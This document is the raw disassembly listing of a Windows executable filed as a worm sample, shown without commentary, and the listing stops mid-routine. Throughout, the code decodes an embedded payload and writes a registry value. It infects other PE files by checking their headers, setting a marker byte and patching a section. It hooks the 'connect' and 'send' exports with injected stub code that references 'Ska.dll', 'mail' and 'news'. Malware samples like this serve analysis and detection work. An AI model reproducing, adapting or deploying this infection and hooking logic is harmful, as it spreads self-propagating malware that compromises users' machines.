
malware_samples/worm/ddd60301114f7867605a31a6d7c4c2014fe28bd4e0edfc53024a22d10b7bf3f8.exe:     file format pei-i386


Disassembly of section CODE:

00410000 <CODE>:
  410000:	68 00 78 00 00       	push   $0x7800
  410005:	6a 40                	push   $0x40
  410007:	e8 d6 08 00 00       	call   0x4108e2
  41000c:	85 c0                	test   %eax,%eax
  41000e:	0f 84 1d 06 00 00    	je     0x410631
  410014:	50                   	push   %eax
  410015:	bf eb 0e 42 00       	mov    $0x420eeb,%edi
  41001a:	ab                   	stos   %eax,%es:(%edi)
  41001b:	05 60 6d 00 00       	add    $0x6d60,%eax
  410020:	ab                   	stos   %eax,%es:(%edi)
  410021:	05 c8 00 00 00       	add    $0xc8,%eax
  410026:	ab                   	stos   %eax,%es:(%edi)
  410027:	58                   	pop    %eax
  410028:	50                   	push   %eax
  410029:	50                   	push   %eax
  41002a:	50                   	push   %eax
  41002b:	5f                   	pop    %edi
  41002c:	b8 94 00 00 00       	mov    $0x94,%eax
  410031:	ab                   	stos   %eax,%es:(%edi)
  410032:	e8 b7 08 00 00       	call   0x4108ee
  410037:	5e                   	pop    %esi
  410038:	83 c6 10             	add    $0x10,%esi
  41003b:	ad                   	lods   %ds:(%esi),%eax
  41003c:	83 f8 00             	cmp    $0x0,%eax
  41003f:	0f 84 ec 05 00 00    	je     0x410631
  410045:	be c9 0d 42 00       	mov    $0x420dc9,%esi
  41004a:	56                   	push   %esi
  41004b:	5f                   	pop    %edi
  41004c:	b9 95 00 00 00       	mov    $0x95,%ecx
  410051:	ac                   	lods   %ds:(%esi),%al
  410052:	f6 d0                	not    %al
  410054:	aa                   	stos   %al,%es:(%edi)
  410055:	e2 fa                	loop   0x410051
  410057:	68 c8 00 00 00       	push   $0xc8
  41005c:	ff 35 ef 0e 42 00    	push   0x420eef
  410062:	e8 8d 08 00 00       	call   0x4108f4
  410067:	85 c0                	test   %eax,%eax
  410069:	0f 84 b7 05 00 00    	je     0x410626
  41006f:	a3 f7 0e 42 00       	mov    %eax,0x420ef7
  410074:	68 c8 00 00 00       	push   $0xc8
  410079:	ff 35 f3 0e 42 00    	push   0x420ef3
  41007f:	6a 00                	push   $0x0
  410081:	e8 56 08 00 00       	call   0x4108dc
  410086:	85 c0                	test   %eax,%eax
  410088:	0f 84 98 05 00 00    	je     0x410626
  41008e:	8b 35 f3 0e 42 00    	mov    0x420ef3,%esi
  410094:	03 f0                	add    %eax,%esi
  410096:	83 ee 05             	sub    $0x5,%esi
  410099:	ac                   	lods   %ds:(%esi),%al
  41009a:	24 df                	and    $0xdf,%al
  41009c:	3c 41                	cmp    $0x41,%al
  41009e:	75 0a                	jne    0x4100aa
  4100a0:	c7 05 8a 0f 42 00 ff 	movl   $0xffffffff,0x420f8a
  4100a7:	ff ff ff 
  4100aa:	be 23 0e 42 00       	mov    $0x420e23,%esi
  4100af:	8b 3d ef 0e 42 00    	mov    0x420eef,%edi
  4100b5:	03 3d f7 0e 42 00    	add    0x420ef7,%edi
  4100bb:	b9 09 00 00 00       	mov    $0x9,%ecx
  4100c0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4100c2:	6a 01                	push   $0x1
  4100c4:	ff 35 ef 0e 42 00    	push   0x420eef
  4100ca:	ff 35 f3 0e 42 00    	push   0x420ef3
  4100d0:	e8 ef 07 00 00       	call   0x4108c4
  4100d5:	be 00 00 42 00       	mov    $0x420000,%esi
  4100da:	8b 3d eb 0e 42 00    	mov    0x420eeb,%edi
  4100e0:	ad                   	lods   %ds:(%esi),%eax
  4100e1:	3d 45 4e 44 20       	cmp    $0x20444e45,%eax
  4100e6:	74 15                	je     0x4100fd
  4100e8:	3d 5a 45 52 4f       	cmp    $0x4f52455a,%eax
  4100ed:	74 05                	je     0x4100f4
  4100ef:	f7 d0                	not    %eax
  4100f1:	ab                   	stos   %eax,%es:(%edi)
  4100f2:	eb ec                	jmp    0x4100e0
  4100f4:	ad                   	lods   %ds:(%esi),%eax
  4100f5:	8b c8                	mov    %eax,%ecx
  4100f7:	33 c0                	xor    %eax,%eax
  4100f9:	f3 ab                	rep stos %eax,%es:(%edi)
  4100fb:	eb e3                	jmp    0x4100e0
  4100fd:	8b cf                	mov    %edi,%ecx
  4100ff:	2b 0d eb 0e 42 00    	sub    0x420eeb,%ecx
  410105:	89 0d fb 0e 42 00    	mov    %ecx,0x420efb
  41010b:	be 1a 0e 42 00       	mov    $0x420e1a,%esi
  410110:	8b 3d ef 0e 42 00    	mov    0x420eef,%edi
  410116:	03 3d f7 0e 42 00    	add    0x420ef7,%edi
  41011c:	b9 09 00 00 00       	mov    $0x9,%ecx
  410121:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  410123:	33 c0                	xor    %eax,%eax
  410125:	50                   	push   %eax
  410126:	68 80 00 00 00       	push   $0x80
  41012b:	6a 02                	push   $0x2
  41012d:	50                   	push   %eax
  41012e:	50                   	push   %eax
  41012f:	68 00 00 00 40       	push   $0x40000000
  410134:	ff 35 ef 0e 42 00    	push   0x420eef
  41013a:	e8 bb 07 00 00       	call   0x4108fa
  41013f:	40                   	inc    %eax
  410140:	0f 84 eb 04 00 00    	je     0x410631
  410146:	48                   	dec    %eax
  410147:	a3 ff 0e 42 00       	mov    %eax,0x420eff
  41014c:	6a 00                	push   $0x0
  41014e:	68 fb 0e 42 00       	push   $0x420efb
  410153:	ff 35 fb 0e 42 00    	push   0x420efb
  410159:	ff 35 eb 0e 42 00    	push   0x420eeb
  41015f:	ff 35 ff 0e 42 00    	push   0x420eff
  410165:	e8 42 07 00 00       	call   0x4108ac
  41016a:	85 c0                	test   %eax,%eax
  41016c:	0f 84 b4 04 00 00    	je     0x410626
  410172:	be 0d 0e 42 00       	mov    $0x420e0d,%esi
  410177:	8b 3d ef 0e 42 00    	mov    0x420eef,%edi
  41017d:	03 3d f7 0e 42 00    	add    0x420ef7,%edi
  410183:	b9 0d 00 00 00       	mov    $0xd,%ecx
  410188:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  41018a:	8b 35 ef 0e 42 00    	mov    0x420eef,%esi
  410190:	8b 3d f3 0e 42 00    	mov    0x420ef3,%edi
  410196:	8b 0d f7 0e 42 00    	mov    0x420ef7,%ecx
  41019c:	83 c1 09             	add    $0x9,%ecx
  41019f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4101a1:	b8 73 6b 61 00       	mov    $0x616b73,%eax
  4101a6:	ab                   	stos   %eax,%es:(%edi)
  4101a7:	6a 01                	push   $0x1
  4101a9:	ff 35 f3 0e 42 00    	push   0x420ef3
  4101af:	ff 35 ef 0e 42 00    	push   0x420eef
  4101b5:	e8 0a 07 00 00       	call   0x4108c4
  4101ba:	33 c0                	xor    %eax,%eax
  4101bc:	50                   	push   %eax
  4101bd:	68 80 00 00 00       	push   $0x80
  4101c2:	6a 03                	push   $0x3
  4101c4:	50                   	push   %eax
  4101c5:	50                   	push   %eax
  4101c6:	68 00 00 00 c0       	push   $0xc0000000
  4101cb:	ff 35 ef 0e 42 00    	push   0x420eef
  4101d1:	e8 24 07 00 00       	call   0x4108fa
  4101d6:	40                   	inc    %eax
  4101d7:	75 52                	jne    0x41022b
  4101d9:	33 c0                	xor    %eax,%eax
  4101db:	ff 35 eb 0e 42 00    	push   0x420eeb
  4101e1:	68 07 0f 42 00       	push   $0x420f07
  4101e6:	50                   	push   %eax
  4101e7:	68 3f 00 1f 00       	push   $0x1f003f
  4101ec:	50                   	push   %eax
  4101ed:	50                   	push   %eax
  4101ee:	50                   	push   %eax
  4101ef:	68 2c 0e 42 00       	push   $0x420e2c
  4101f4:	68 02 00 00 80       	push   $0x80000002
  4101f9:	e8 20 07 00 00       	call   0x41091e
  4101fe:	b8 08 00 00 00       	mov    $0x8,%eax
  410203:	50                   	push   %eax
  410204:	b8 23 0e 42 00       	mov    $0x420e23,%eax
  410209:	40                   	inc    %eax
  41020a:	50                   	push   %eax
  41020b:	6a 01                	push   $0x1
  41020d:	6a 00                	push   $0x0
  41020f:	50                   	push   %eax
  410210:	ff 35 07 0f 42 00    	push   0x420f07
  410216:	e8 fd 06 00 00       	call   0x410918
  41021b:	ff 35 07 0f 42 00    	push   0x420f07
  410221:	e8 fe 06 00 00       	call   0x410924
  410226:	e9 fb 03 00 00       	jmp    0x410626
  41022b:	48                   	dec    %eax
  41022c:	a3 5e 0e 42 00       	mov    %eax,0x420e5e
  410231:	33 c0                	xor    %eax,%eax
  410233:	50                   	push   %eax
  410234:	50                   	push   %eax
  410235:	50                   	push   %eax
  410236:	6a 04                	push   $0x4
  410238:	50                   	push   %eax
  410239:	ff 35 5e 0e 42 00    	push   0x420e5e
  41023f:	e8 a4 06 00 00       	call   0x4108e8
  410244:	85 c0                	test   %eax,%eax
  410246:	0f 84 cf 03 00 00    	je     0x41061b
  41024c:	a3 66 0e 42 00       	mov    %eax,0x420e66
  410251:	33 c0                	xor    %eax,%eax
  410253:	50                   	push   %eax
  410254:	50                   	push   %eax
  410255:	50                   	push   %eax
  410256:	6a 06                	push   $0x6
  410258:	ff 35 66 0e 42 00    	push   0x420e66
  41025e:	e8 a9 06 00 00       	call   0x41090c
  410263:	85 c0                	test   %eax,%eax
  410265:	0f 84 a5 03 00 00    	je     0x410610
  41026b:	a3 6a 0e 42 00       	mov    %eax,0x420e6a
  410270:	8b f0                	mov    %eax,%esi
  410272:	66 81 3e 4d 5a       	cmpw   $0x5a4d,(%esi)
  410277:	0f 85 93 03 00 00    	jne    0x410610
  41027d:	80 7e 12 7a          	cmpb   $0x7a,0x12(%esi)
  410281:	0f 84 89 03 00 00    	je     0x410610
  410287:	c6 46 12 7a          	movb   $0x7a,0x12(%esi)
  41028b:	03 76 3c             	add    0x3c(%esi),%esi
  41028e:	66 81 3e 50 45       	cmpw   $0x4550,(%esi)
  410293:	0f 85 77 03 00 00    	jne    0x410610
  410299:	89 35 72 0e 42 00    	mov    %esi,0x420e72
  41029f:	66 8b 46 06          	mov    0x6(%esi),%ax
  4102a3:	66 a3 76 0e 42 00    	mov    %ax,0x420e76
  4102a9:	33 c9                	xor    %ecx,%ecx
  4102ab:	66 8b 0d 76 0e 42 00 	mov    0x420e76,%cx
  4102b2:	66 8b 46 14          	mov    0x14(%esi),%ax
  4102b6:	66 a3 78 0e 42 00    	mov    %ax,0x420e78
  4102bc:	8b de                	mov    %esi,%ebx
  4102be:	83 c3 18             	add    $0x18,%ebx
  4102c1:	33 c0                	xor    %eax,%eax
  4102c3:	66 03 05 78 0e 42 00 	add    0x420e78,%ax
  4102ca:	03 d8                	add    %eax,%ebx
  4102cc:	8b 03                	mov    (%ebx),%eax
  4102ce:	3d 2e 74 65 78       	cmp    $0x7865742e,%eax
  4102d3:	74 23                	je     0x4102f8
  4102d5:	3d 2e 65 64 61       	cmp    $0x6164652e,%eax
  4102da:	74 0f                	je     0x4102eb
  4102dc:	3d 2e 64 61 74       	cmp    $0x7461642e,%eax
  4102e1:	74 59                	je     0x41033c
  4102e3:	83 c3 28             	add    $0x28,%ebx
  4102e6:	49                   	dec    %ecx
  4102e7:	75 e3                	jne    0x4102cc
  4102e9:	eb 5e                	jmp    0x410349
  4102eb:	8b 43 0c             	mov    0xc(%ebx),%eax
  4102ee:	2b 43 14             	sub    0x14(%ebx),%eax
  4102f1:	a3 7a 0e 42 00       	mov    %eax,0x420e7a
  4102f6:	eb e4                	jmp    0x4102dc
  4102f8:	f7 43 24 20 00 00 60 	testl  $0x60000020,0x24(%ebx)
  4102ff:	0f 84 2c 03 00 00    	je     0x410631
  410305:	81 4b 24 00 00 00 80 	orl    $0x80000000,0x24(%ebx)
  41030c:	89 1d 9e 0e 42 00    	mov    %ebx,0x420e9e
  410312:	8b 43 10             	mov    0x10(%ebx),%eax
  410315:	8b 7b 08             	mov    0x8(%ebx),%edi
  410318:	2b c7                	sub    %edi,%eax
  41031a:	3d ca 00 00 00       	cmp    $0xca,%eax
  41031f:	0f 82 0c 03 00 00    	jb     0x410631
  410325:	8b 43 0c             	mov    0xc(%ebx),%eax
  410328:	8b 53 14             	mov    0x14(%ebx),%edx
  41032b:	2b c2                	sub    %edx,%eax
  41032d:	a3 7e 0e 42 00       	mov    %eax,0x420e7e
  410332:	03 d7                	add    %edi,%edx
  410334:	89 15 92 0e 42 00    	mov    %edx,0x420e92
  41033a:	eb 99                	jmp    0x4102d5
  41033c:	8b 43 0c             	mov    0xc(%ebx),%eax
  41033f:	2b 43 14             	sub    0x14(%ebx),%eax
  410342:	a3 82 0e 42 00       	mov    %eax,0x420e82
  410347:	eb 9a                	jmp    0x4102e3
  410349:	bf 86 0e 42 00       	mov    $0x420e86,%edi
  41034e:	8b 15 7a 0e 42 00    	mov    0x420e7a,%edx
  410354:	8b 5e 78             	mov    0x78(%esi),%ebx
  410357:	8b 35 6a 0e 42 00    	mov    0x420e6a,%esi
  41035d:	2b da                	sub    %edx,%ebx
  41035f:	03 de                	add    %esi,%ebx
  410361:	8b 43 1c             	mov    0x1c(%ebx),%eax
  410364:	2b c2                	sub    %edx,%eax
  410366:	03 c6                	add    %esi,%eax
  410368:	ab                   	stos   %eax,%es:(%edi)
  410369:	8b 43 20             	mov    0x20(%ebx),%eax
  41036c:	2b c2                	sub    %edx,%eax
  41036e:	03 c6                	add    %esi,%eax
  410370:	ab                   	stos   %eax,%es:(%edi)
  410371:	8b 43 24             	mov    0x24(%ebx),%eax
  410374:	2b c2                	sub    %edx,%eax
  410376:	03 c6                	add    %esi,%eax
  410378:	ab                   	stos   %eax,%es:(%edi)
  410379:	8b 4b 18             	mov    0x18(%ebx),%ecx
  41037c:	33 d2                	xor    %edx,%edx
  41037e:	8b 35 8a 0e 42 00    	mov    0x420e8a,%esi
  410384:	c7 05 a2 0e 42 00 00 	movl   $0x0,0x420ea2
  41038b:	00 00 00 
  41038e:	8b 1e                	mov    (%esi),%ebx
  410390:	2b 1d 7a 0e 42 00    	sub    0x420e7a,%ebx
  410396:	03 1d 6a 0e 42 00    	add    0x420e6a,%ebx
  41039c:	8b 03                	mov    (%ebx),%eax
  41039e:	3d 63 6f 6e 6e       	cmp    $0x6e6e6f63,%eax
  4103a3:	74 20                	je     0x4103c5
  4103a5:	3d 73 65 6e 64       	cmp    $0x646e6573,%eax
  4103aa:	74 62                	je     0x41040e
  4103ac:	42                   	inc    %edx
  4103ad:	83 c6 04             	add    $0x4,%esi
  4103b0:	49                   	dec    %ecx
  4103b1:	75 db                	jne    0x41038e
  4103b3:	83 3d a2 0e 42 00 02 	cmpl   $0x2,0x420ea2
  4103ba:	0f 85 71 02 00 00    	jne    0x410631
  4103c0:	e9 92 00 00 00       	jmp    0x410457
  4103c5:	83 c3 04             	add    $0x4,%ebx
  4103c8:	8b 03                	mov    (%ebx),%eax
  4103ca:	3d 65 63 74 00       	cmp    $0x746365,%eax
  4103cf:	75 db                	jne    0x4103ac
  4103d1:	52                   	push   %edx
  4103d2:	56                   	push   %esi
  4103d3:	8b 1d 8e 0e 42 00    	mov    0x420e8e,%ebx
  4103d9:	d1 e2                	shl    $1,%edx
  4103db:	03 da                	add    %edx,%ebx
  4103dd:	33 c0                	xor    %eax,%eax
  4103df:	66 8b 03             	mov    (%ebx),%ax
  4103e2:	8b 35 86 0e 42 00    	mov    0x420e86,%esi
  4103e8:	c1 e0 02             	shl    $0x2,%eax
  4103eb:	03 f0                	add    %eax,%esi
  4103ed:	8b 06                	mov    (%esi),%eax
  4103ef:	a3 96 0e 42 00       	mov    %eax,0x420e96
  4103f4:	a1 92 0e 42 00       	mov    0x420e92,%eax
  4103f9:	03 05 7e 0e 42 00    	add    0x420e7e,%eax
  4103ff:	83 c0 00             	add    $0x0,%eax
  410402:	89 06                	mov    %eax,(%esi)
  410404:	ff 05 a2 0e 42 00    	incl   0x420ea2
  41040a:	5e                   	pop    %esi
  41040b:	5a                   	pop    %edx
  41040c:	eb 9e                	jmp    0x4103ac
  41040e:	83 c3 04             	add    $0x4,%ebx
  410411:	8a 03                	mov    (%ebx),%al
  410413:	3c 00                	cmp    $0x0,%al
  410415:	75 95                	jne    0x4103ac
  410417:	52                   	push   %edx
  410418:	56                   	push   %esi
  410419:	8b 1d 8e 0e 42 00    	mov    0x420e8e,%ebx
  41041f:	d1 e2                	shl    $1,%edx
  410421:	03 da                	add    %edx,%ebx
  410423:	33 c0                	xor    %eax,%eax
  410425:	66 8b 03             	mov    (%ebx),%ax
  410428:	8b 35 86 0e 42 00    	mov    0x420e86,%esi
  41042e:	c1 e0 02             	shl    $0x2,%eax
  410431:	03 f0                	add    %eax,%esi
  410433:	8b 06                	mov    (%esi),%eax
  410435:	a3 9a 0e 42 00       	mov    %eax,0x420e9a
  41043a:	a1 92 0e 42 00       	mov    0x420e92,%eax
  41043f:	03 05 7e 0e 42 00    	add    0x420e7e,%eax
  410445:	83 c0 47             	add    $0x47,%eax
  410448:	89 06                	mov    %eax,(%esi)
  41044a:	ff 05 a2 0e 42 00    	incl   0x420ea2
  410450:	5e                   	pop    %esi
  410451:	5a                   	pop    %edx
  410452:	e9 55 ff ff ff       	jmp    0x4103ac
  410457:	8b 35 9e 0e 42 00    	mov    0x420e9e,%esi
  41045d:	81 46 08 ca 00 00 00 	addl   $0xca,0x8(%esi)
  410464:	68 aa 0e 42 00       	push   $0x420eaa
  410469:	e8 50 04 00 00       	call   0x4108be
  41046e:	85 c0                	test   %eax,%eax
  410470:	0f 84 9a 01 00 00    	je     0x410610
  410476:	a3 a6 0e 42 00       	mov    %eax,0x420ea6
  41047b:	68 b7 0e 42 00       	push   $0x420eb7
  410480:	ff 35 a6 0e 42 00    	push   0x420ea6
  410486:	e8 3f 04 00 00       	call   0x4108ca
  41048b:	85 c0                	test   %eax,%eax
  41048d:	0f 84 7d 01 00 00    	je     0x410610
  410493:	a3 df 0e 42 00       	mov    %eax,0x420edf
  410498:	68 c4 0e 42 00       	push   $0x420ec4
  41049d:	ff 35 a6 0e 42 00    	push   0x420ea6
  4104a3:	e8 22 04 00 00       	call   0x4108ca
  4104a8:	85 c0                	test   %eax,%eax
  4104aa:	0f 84 60 01 00 00    	je     0x410610
  4104b0:	a3 e3 0e 42 00       	mov    %eax,0x420ee3
  4104b5:	68 d0 0e 42 00       	push   $0x420ed0
  4104ba:	ff 35 a6 0e 42 00    	push   0x420ea6
  4104c0:	e8 05 04 00 00       	call   0x4108ca
  4104c5:	85 c0                	test   %eax,%eax
  4104c7:	0f 84 43 01 00 00    	je     0x410610
  4104cd:	a3 e7 0e 42 00       	mov    %eax,0x420ee7
  4104d2:	8b 3d 92 0e 42 00    	mov    0x420e92,%edi
  4104d8:	03 3d 6a 0e 42 00    	add    0x420e6a,%edi
  4104de:	e8 ca 00 00 00       	call   0x4105ad
  4104e3:	9c                   	pushf
  4104e4:	60                   	pusha
  4104e5:	e8 00 00 00 00       	call   0x4104ea
  4104ea:	5f                   	pop    %edi
  4104eb:	81 c7 bd 00 00 00    	add    $0xbd,%edi
  4104f1:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4104f5:	8a 43 03             	mov    0x3(%ebx),%al
  4104f8:	3c 19                	cmp    $0x19,%al
  4104fa:	75 08                	jne    0x410504
  4104fc:	8b 44 24 28          	mov    0x28(%esp),%eax
  410500:	aa                   	stos   %al,%es:(%edi)
  410501:	47                   	inc    %edi
  410502:	eb 0a                	jmp    0x41050e
  410504:	3c 77                	cmp    $0x77,%al
  410506:	75 1b                	jne    0x410523
  410508:	47                   	inc    %edi
  410509:	8b 44 24 28          	mov    0x28(%esp),%eax
  41050d:	aa                   	stos   %al,%es:(%edi)
  41050e:	e8 08 00 00 00       	call   0x41051b
  410513:	53                   	push   %ebx
  410514:	6b 61 2e 64          	imul   $0x64,0x2e(%ecx),%esp
  410518:	6c                   	insb   (%dx),%es:(%edi)
  410519:	6c                   	insb   (%dx),%es:(%edi)
  41051a:	00 b8 ff ff ff ff    	add    %bh,-0x1(%eax)
  410520:	ff d0                	call   *%eax
  410522:	ab                   	stos   %eax,%es:(%edi)
  410523:	61                   	popa
  410524:	9d                   	popf
  410525:	e9 00 00 00 00       	jmp    0x41052a
  41052a:	9c                   	pushf
  41052b:	60                   	pusha
  41052c:	e8 00 00 00 00       	call   0x410531
  410531:	5e                   	pop    %esi
  410532:	83 c6 76             	add    $0x76,%esi
  410535:	66 ad                	lods   %ds:(%esi),%ax
  410537:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  41053b:	3a e3                	cmp    %bl,%ah
  41053d:	74 10                	je     0x41054f
  41053f:	3a c3                	cmp    %bl,%al
  410541:	74 02                	je     0x410545
  410543:	eb 5b                	jmp    0x4105a0
  410545:	e8 0f 00 00 00       	call   0x410559
  41054a:	6d                   	insl   (%dx),%es:(%edi)
  41054b:	61                   	popa
  41054c:	69 6c 00 e8 05 00 00 	imul   $0x5,-0x18(%eax,%eax,1),%ebp
  410553:	00 
  410554:	6e                   	outsb  %ds:(%esi),(%dx)
  410555:	65 77 73             	gs ja  0x4105cb
  410558:	00 ad 50 b8 ff ff    	add    %ch,-0x47b0(%ebp)
  41055e:	ff                   	(bad)
  41055f:	ff                   	(bad)
  410560:	ff d0                	call   *%eax
  410562:	85 c0                	test   %eax,%eax
  410564:	74 3a                	je     0x4105a0
  410566:	ff d0                	call   *%eax
  410568:	3c 01                	cmp    $0x1,%al
  41056a:	74 34                	je     0x4105a0
  41056c:	66 93                	xchg   %ax,%bx
  41056e:	e8 00 00 00 00       	call   0x410573
  410573:	5e                   	pop    %esi
  410574:	83 c6 34             	add    $0x34,%esi
  410577:	56                   	push   %esi
  410578:	5f                   	pop    %edi
  410579:	33 c0                	xor    %eax,%eax
  41057b:	80 fb 4e             	cmp    $0x4e,%bl
  41057e:	75 0a                	jne    0x41058a
  410580:	47                   	inc    %edi
  410581:	aa                   	stos   %al,%es:(%edi)
  410582:	ac                   	lods   %ds:(%esi),%al
  410583:	3c 00                	cmp    $0x0,%al
  410585:	75 19                	jne    0x4105a0
  410587:	46                   	inc    %esi
  410588:	eb 0d                	jmp    0x410597
  41058a:	80 fb 4d             	cmp    $0x4d,%bl
  41058d:	75 11                	jne    0x4105a0
  41058f:	aa                   	stos   %al,%es:(%edi)
  410590:	47                   	inc    %edi
  410591:	46                   	inc    %esi
  410592:	ac                   	lods   %ds:(%esi),%al
  410593:	3c 00                	cmp    $0x0,%al
  410595:	75 09                	jne    0x4105a0
  410597:	ad                   	lods   %ds:(%esi),%eax
  410598:	50                   	push   %eax
  410599:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  41059e:	ff d0                	call   *%eax
  4105a0:	61                   	popa
  4105a1:	9d                   	popf
  4105a2:	e9 00 00 00 00       	jmp    0x4105a7
  4105a7:	00 00                	add    %al,(%eax)
  4105a9:	00 00                	add    %al,(%eax)
  4105ab:	00 00                	add    %al,(%eax)
  4105ad:	5e                   	pop    %esi
  4105ae:	b9 ca 00 00 00       	mov    $0xca,%ecx
  4105b3:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4105b5:	a1 df 0e 42 00       	mov    0x420edf,%eax
  4105ba:	89 87 6f ff ff ff    	mov    %eax,-0x91(%edi)
  4105c0:	a1 e7 0e 42 00       	mov    0x420ee7,%eax
  4105c5:	89 47 af             	mov    %eax,-0x51(%edi)
  4105c8:	a1 e3 0e 42 00       	mov    0x420ee3,%eax
  4105cd:	89 47 ed             	mov    %eax,-0x13(%edi)
  4105d0:	8b 15 7e 0e 42 00    	mov    0x420e7e,%edx
  4105d6:	a1 92 0e 42 00       	mov    0x420e92,%eax
  4105db:	03 c2                	add    %edx,%eax
  4105dd:	83 c0 46             	add    $0x46,%eax
  4105e0:	2b 05 96 0e 42 00    	sub    0x420e96,%eax
  4105e6:	f7 d0                	not    %eax
  4105e8:	89 87 79 ff ff ff    	mov    %eax,-0x87(%edi)
  4105ee:	a1 92 0e 42 00       	mov    0x420e92,%eax
  4105f3:	03 c2                	add    %edx,%eax
  4105f5:	05 c3 00 00 00       	add    $0xc3,%eax
  4105fa:	2b 05 9a 0e 42 00    	sub    0x420e9a,%eax
  410600:	f7 d0                	not    %eax
  410602:	89 47 f6             	mov    %eax,-0xa(%edi)
  410605:	ff 35 6a 0e 42 00    	push   0x420e6a
  41060b:	e8 a2 02 00 00       	call   0x4108b2
  410610:	ff 35 66 0e 42 00    	push   0x420e66
  410616:	e8 e5 02 00 00       	call   0x410900
  41061b:	ff 35 5e 0e 42 00    	push   0x420e5e
  410621:	e8 da 02 00 00       	call   0x410900
  410626:	ff 35 eb 0e 42 00    	push   0x420eeb
  41062c:	e8 d5 02 00 00       	call   0x410906
  410631:	83 3d 8a 0f 42 00 00 	cmpl   $0x0,0x420f8a
  410638:	74 07                	je     0x410641
  41063a:	6a ff                	push   $0xffffffff
  41063c:	e8 8f 02 00 00       	call   0x4108d0
  410641:	68 00 02 02 00       	push   $0x20200
  410646:	6a 40                	push   $0x40
  410648:	e8 95 02 00 00       	call   0x4108e2
  41064d:	a3 eb 0e 42 00       	mov    %eax,0x420eeb
  410652:	6a 00                	push   $0x0
  410654:	e8 65 02 00 00       	call   0x4108be
  410659:	a3 7e 0f 42 00       	mov    %eax,0x420f7e
  41065e:	a3 1b 0f 42 00       	mov    %eax,0x420f1b
  410663:	b8 e7 07 41 00       	mov    $0x4107e7,%eax
  410668:	a3 0f 0f 42 00       	mov    %eax,0x420f0f
  41066d:	c7 05 2f 0f 42 00 67 	movl   $0x420f67,0x420f2f
  410674:	0f 42 00 
  410677:	68 0b 0f 42 00       	push   $0x420f0b
  41067c:	e8 af 02 00 00       	call   0x410930
  410681:	33 c0                	xor    %eax,%eax
  410683:	50                   	push   %eax
  410684:	ff 35 7e 0f 42 00    	push   0x420f7e
  41068a:	50                   	push   %eax
  41068b:	50                   	push   %eax
  41068c:	68 00 02 00 00       	push   $0x200
  410691:	68 00 01 00 00       	push   $0x100
  410696:	6a 64                	push   $0x64
  410698:	6a 64                	push   $0x64
  41069a:	68 00 00 0c 00       	push   $0xc0000
  41069f:	68 67 0f 42 00       	push   $0x420f67
  4106a4:	68 67 0f 42 00       	push   $0x420f67
  4106a9:	50                   	push   %eax
  4106aa:	e8 a5 02 00 00       	call   0x410954
  4106af:	a3 82 0f 42 00       	mov    %eax,0x420f82
  4106b4:	6a 01                	push   $0x1
  4106b6:	ff 35 82 0f 42 00    	push   0x420f82
  4106bc:	e8 99 02 00 00       	call   0x41095a
  4106c1:	ff 35 82 0f 42 00    	push   0x420f82
  4106c7:	e8 94 02 00 00       	call   0x410960
  4106cc:	ff 35 82 0f 42 00    	push   0x420f82
  4106d2:	e8 6b 02 00 00       	call   0x410942
  4106d7:	a3 63 0f 42 00       	mov    %eax,0x420f63
  4106dc:	33 c0                	xor    %eax,%eax
  4106de:	6a 01                	push   $0x1
  4106e0:	50                   	push   %eax
  4106e1:	50                   	push   %eax
  4106e2:	50                   	push   %eax
  4106e3:	68 33 0f 42 00       	push   $0x420f33
  4106e8:	e8 4f 02 00 00       	call   0x41093c
  4106ed:	85 c0                	test   %eax,%eax
  4106ef:	0f 85 b3 00 00 00    	jne    0x4107a8
  4106f5:	a1 53 0f 42 00       	mov    0x420f53,%eax
  4106fa:	83 e0 0f             	and    $0xf,%eax
  4106fd:	a3 53 0f 42 00       	mov    %eax,0x420f53
  410702:	83 f8 00             	cmp    $0x0,%eax
  410705:	0f 84 01 01 00 00    	je     0x41080c
  41070b:	b9 00 10 00 00       	mov    $0x1000,%ecx
  410710:	8b 35 eb 0e 42 00    	mov    0x420eeb,%esi
  410716:	51                   	push   %ecx
  410717:	56                   	push   %esi
  410718:	5f                   	pop    %edi
  410719:	83 c7 14             	add    $0x14,%edi
  41071c:	8b 46 08             	mov    0x8(%esi),%eax
  41071f:	ab                   	stos   %eax,%es:(%edi)
  410720:	8b 46 0c             	mov    0xc(%esi),%eax
  410723:	ab                   	stos   %eax,%es:(%edi)
  410724:	81 06 00 10 00 00    	addl   $0x1000,(%esi)
  41072a:	ad                   	lods   %ds:(%esi),%eax
  41072b:	01 46 04             	add    %eax,0x4(%esi)
  41072e:	ad                   	lods   %ds:(%esi),%eax
  41072f:	01 46 04             	add    %eax,0x4(%esi)
  410732:	ad                   	lods   %ds:(%esi),%eax
  410733:	c1 f8 10             	sar    $0x10,%eax
  410736:	8b d0                	mov    %eax,%edx
  410738:	ad                   	lods   %ds:(%esi),%eax
  410739:	c1 f8 10             	sar    $0x10,%eax
  41073c:	8b d8                	mov    %eax,%ebx
  41073e:	ad                   	lods   %ds:(%esi),%eax
  41073f:	83 f8 00             	cmp    $0x0,%eax
  410742:	75 05                	jne    0x410749
  410744:	83 c6 08             	add    $0x8,%esi
  410747:	eb 49                	jmp    0x410792
  410749:	80 6e fc 01          	subb   $0x1,-0x4(%esi)
  41074d:	73 04                	jae    0x410753
  41074f:	c6 46 fc 00          	movb   $0x0,-0x4(%esi)
  410753:	80 6e fd 01          	subb   $0x1,-0x3(%esi)
  410757:	73 04                	jae    0x41075d
  410759:	c6 46 fd 00          	movb   $0x0,-0x3(%esi)
  41075d:	80 6e fe 01          	subb   $0x1,-0x2(%esi)
  410761:	73 04                	jae    0x410767
  410763:	c6 46 fe 00          	movb   $0x0,-0x2(%esi)
  410767:	56                   	push   %esi
  410768:	50                   	push   %eax
  410769:	52                   	push   %edx
  41076a:	53                   	push   %ebx
  41076b:	ff 35 63 0f 42 00    	push   0x420f63
  410771:	e8 f6 01 00 00       	call   0x41096c
  410776:	5e                   	pop    %esi
  410777:	ad                   	lods   %ds:(%esi),%eax
  410778:	c1 f8 10             	sar    $0x10,%eax
  41077b:	8b d0                	mov    %eax,%edx
  41077d:	ad                   	lods   %ds:(%esi),%eax
  41077e:	c1 f8 10             	sar    $0x10,%eax
